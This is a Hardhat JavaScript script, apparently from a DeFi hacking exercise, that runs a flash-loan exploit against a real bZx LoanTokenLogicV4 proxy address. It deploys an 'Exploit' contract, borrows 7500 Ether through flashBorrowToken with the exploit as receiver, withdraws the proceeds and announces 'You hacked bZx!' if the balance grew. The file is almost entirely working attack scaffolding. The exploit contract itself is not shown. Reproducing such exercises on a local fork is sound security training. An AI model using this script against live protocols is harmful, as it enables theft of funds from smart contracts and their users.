const hre = require("hardhat");
const ethers = hre.ethers;

async function main() {
  // set up two wallets
  const [owner, exploiter] = await ethers.getSigners();
  console.log(`***** Wallets\n`);
  console.log(`exploiter:\t${exploiter.address}\n\n`);

  // send all but ~10 Ether
  await exploiter.sendTransaction({value: "0x21d8f19a6b628580000", to: owner.address});

  // deploy exploit contract
  const Exploit = await ethers.getContractFactory("Exploit", exploiter);
  const exploit = await Exploit.deploy();

  const initialBalance = await exploiter.provider.getBalance(exploiter.address);

  // address 0x77f973FCaF871459aa58cd81881Ce453759281bC is PROXY of
  // address 0x85CA13d8496b2D22D6518fAeB524911E096Dd7E0 which is LoanTokenLogicV4 (bZx flash loanable)
  const bZxAddress = "0x77f973FCaF871459aa58cd81881Ce453759281bC";
  const bZx = await ethers.getContractAt("LoanTokenLogicV4", bZxAddress, exploiter);

  // set up arguments for bZx `flashBorrowToken`
  const borrowAmount = ethers.utils.parseEther("7500");
  const signature = ""; // if signature is empty, it's retrieved from the data
  const data = ethers.utils.arrayify("0x63d9b770");

  // call flash borrow pointing at the exploit contract
  console.log("***** Calling bZx flash borrow\n(this will revert with `40` if you don't pay back your loan)\n\n");
  await bZx.flashBorrowToken(borrowAmount, exploit.address, exploit.address, signature, data);

  // withdraw funds from contract
  await exploit.withdraw();

  const newBalance = await exploiter.provider.getBalance(exploiter.address);

  console.log(`***** Balances\n`);
  console.log(`initial:\t${ethers.utils.formatUnits(initialBalance, 18)}\nfinal:\t${ethers.utils.formatUnits(newBalance, 18)}\n\n`);

  if (newBalance.gt(initialBalance)) {
    console.log("Nice job! You hacked bZx!");
  } else {
    console.log("OOPS! You paid back your flash loan but didn't make money :(");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
